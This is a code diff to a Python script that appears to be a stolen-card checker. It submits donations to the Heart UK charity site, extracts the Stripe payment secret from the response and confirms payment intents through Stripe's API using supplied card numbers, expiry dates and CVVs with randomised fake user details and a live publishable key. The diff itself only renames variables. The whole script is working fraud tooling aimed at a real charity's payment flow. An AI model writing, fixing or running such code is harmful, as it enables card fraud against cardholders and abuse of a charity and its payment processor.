@@ -42,14 +42,14 @@ def chk_one(r,rand_user):
     # }
 
     c = r.post('https://www.heartuk.org.uk/donate/single-donation/submit', b_data)
-    stripe = find_between(c.text,'stripe.handleCardPayment(','",')
-    if not stripe: return "Token Error", "❌", 'Token'
-    return stripe
+    confirmCardPayment = find_between(c.text, 'stripe.handleCardPayment("','"')
+    if not confirmCardPayment: return
+    return confirmCardPayment
 
 
-def chk_two(r, sec, cc, mes,ano, cvv,rand_user):
-    pi = sec.strip().replace('"','')
-    pi_sec = pi.split('_sec')[0]
+
+def chk_two(r, sec, cc, mes,ano, cvv, rand_user):
+    req_sec = sec.split('_secret')[0]
     payload_e = {
     'payment_method_data[type]': 'card',
     'payment_method_data[billing_details][name]': rand_user['name'],
@@ -66,10 +66,10 @@ def chk_two(r, sec, cc, mes,ano, cvv,rand_user):
     'expected_payment_method_type': 'card',
     'use_stripe_sdk': 'true',
     'key': 'pk_live_b0Wwz4q7JcwFqfqBjmSkndzv',
-    'client_secret': pi,
+    'client_secret': sec,
     }
 
-    e = requests.post(f'https://api.stripe.com/v1/payment_intents/{pi_sec}/confirm', data = payload_e)
+    e = requests.post(f'https://api.stripe.com/v1/payment_intents/{req_sec}/confirm', data = payload_e)
     return e.json()
 
 
